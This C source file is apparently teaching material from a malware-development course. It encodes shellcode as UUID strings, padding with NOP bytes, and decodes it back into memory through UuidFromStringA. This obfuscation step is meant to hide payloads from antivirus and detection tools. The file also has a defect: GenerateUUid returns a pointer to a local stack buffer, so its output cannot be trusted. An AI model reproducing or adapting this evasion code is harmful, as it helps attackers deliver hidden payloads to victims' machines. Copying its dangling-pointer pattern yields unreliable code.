// @NUL0x4C | @mrd0x : MalDevAcademy
#include <Windows.h>
#include <stdio.h>
#include "../include/crypt.h"

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

char* GenerateUUid(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

	// Each UUID segment is 32 bytes
	char Output0[32], Output1[32], Output2[32], Output3[32];

	// There are 4 segments in a UUID (32 * 4 = 128)
	char result[128];

	// Generating output0 from the first 4 bytes
	sprintf(Output0, "%0.2X%0.2X%0.2X%0.2X", d, c, b, a);

	// Generating output1 from the second 4 bytes
	sprintf(Output1, "%0.2X%0.2X-%0.2X%0.2X", f, e, h, g);

	// Generating output2 from the third 4 bytes
	sprintf(Output2, "%0.2X%0.2X-%0.2X%0.2X", i, j, k, l);

	// Generating output3 from the last 4 bytes
	sprintf(Output3, "%0.2X%0.2X%0.2X%0.2X", m, n, o, p);

	// Combining Output0,1,2,3 to generate the UUID
	sprintf(result, "%s-%s-%s%s", Output0, Output1, Output2, Output3);

	//printf("[i] result: %s\n", (char*)result);
	return (char*)result;
}

BOOL PadBufferFor16(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, OUT PBYTE* ppPaddedBuffer, OUT SIZE_T* pPaddedSize) {

	// حساب الحجم الجديد: لو هو 16 هيفضل زي ما هو، لو أقل هيكمل لـ 16
	SIZE_T sPaddedSize = (sShellcodeSize + 15) & ~15;

	// تخصيص مساحة في الـ Heap للـ Buffer الجديد
	PBYTE pPaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPaddedSize);
	if (pPaddedBuffer == NULL) {
		return FALSE;
	}

	// نسخ الـ Shellcode القديم للجديد
	memcpy(pPaddedBuffer, pShellcode, sShellcodeSize);

	// ملء الفراغ بـ NOPs (0x90) أو أصفار (0x00)
	// الـ 0x90 أحياناً أحسن في الـ Shellcode عشان لو التنفيذ وصلها ميعملش Crash
	if (sPaddedSize > sShellcodeSize) {
		memset(pPaddedBuffer + sShellcodeSize, 0x90, sPaddedSize - sShellcodeSize);
	}

	*ppPaddedBuffer = pPaddedBuffer;
	*pPaddedSize = sPaddedSize;

	return TRUE;
}

// Generate the UUID output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateUuidOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	if (pShellcode == NULL || ShellcodeSize == 0) {
		return FALSE;
	}

	PBYTE pBufferToUse = pShellcode;
	SIZE_T sSizeToUse = ShellcodeSize;
	BOOL bIsPadded = FALSE;

	// 1. فحص تلقائي للحجم: لو مش مضاعفات 16، اعمل Padding
	if (ShellcodeSize % 16 != 0) {
		if (!PadBufferFor16(pShellcode, ShellcodeSize, &pBufferToUse, &sSizeToUse)) {
			return FALSE;
		}
		bIsPadded = TRUE; // علامة عشان نمسحه من الميموري في الآخر
	}

	// 2. البدء في الطباعة (باستخدام الحجم الجديد المضمون)
	printf("char* UuidArray[%d] = { \n\t", (int)(sSizeToUse / 16));

	int c = 16, counter = 0;
	char* UUID = NULL;

	for (int i = 0; i < sSizeToUse; i++) {
		if (c == 16) {
			counter++;
			UUID = GenerateUUid(
				pBufferToUse[i], pBufferToUse[i + 1], pBufferToUse[i + 2], pBufferToUse[i + 3],
				pBufferToUse[i + 4], pBufferToUse[i + 5], pBufferToUse[i + 6], pBufferToUse[i + 7],
				pBufferToUse[i + 8], pBufferToUse[i + 9], pBufferToUse[i + 10], pBufferToUse[i + 11],
				pBufferToUse[i + 12], pBufferToUse[i + 13], pBufferToUse[i + 14], pBufferToUse[i + 15]
			);

			if (i == sSizeToUse - 16) {
				printf("\"%s\"", UUID);
				break;
			}
			else {
				printf("\"%s\", ", UUID);
			}
			c = 1;
			if (counter % 3 == 0) printf("\n\t");
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");

	// 3. تنظيف الميموري لو كنا عملنا Buffer جديد (Padding)
	if (bIsPadded && pBufferToUse != NULL) {
		HeapFree(GetProcessHeap(), 0, pBufferToUse);
	}

	return TRUE;
}

// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID*		Uuid
);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer = NULL,
			TmpBuffer = NULL;

	SIZE_T		sBuffSize = NULL;

	RPC_STATUS 	STATUS = NULL;

	// Getting UuidFromStringA address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

		// Getting the real size of the shellcode which is the number of UUID strings * 16
	sBuffSize = NmbrOfElements * 16;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the UUID strings saved in UuidArray
	for (int i = 0; i < NmbrOfElements; i++) {
		
		// Deobfuscating one UUID string at a time
		// UuidArray[i] is a single UUID string from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// if it failed
			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;
}


